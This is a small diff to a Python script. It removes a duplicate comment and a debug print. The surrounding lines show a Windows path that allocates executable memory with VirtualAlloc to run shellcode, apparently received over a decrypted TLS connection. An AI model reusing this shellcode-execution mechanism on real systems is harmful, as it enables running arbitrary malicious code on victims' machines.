@@ -39,7 +39,6 @@ def do_magic(ctx):
         func()
     else:
         # it is windows
-        # it is windows
         # extremely straight forward shellcode execution mechanism
         ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
         rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
@@ -186,7 +185,6 @@ if __name__ == "__main__":
     print(decrypted_application_data.decode())
     
     do_magic(ctx)
-    print("HERHEREHEREHERE")
     data = sock.recv(4096) # this will contain close_notify alert
     records, decrypted_alert = tls_parser.parse_tls_records(data)
     print("[+] Received close_notify alert")
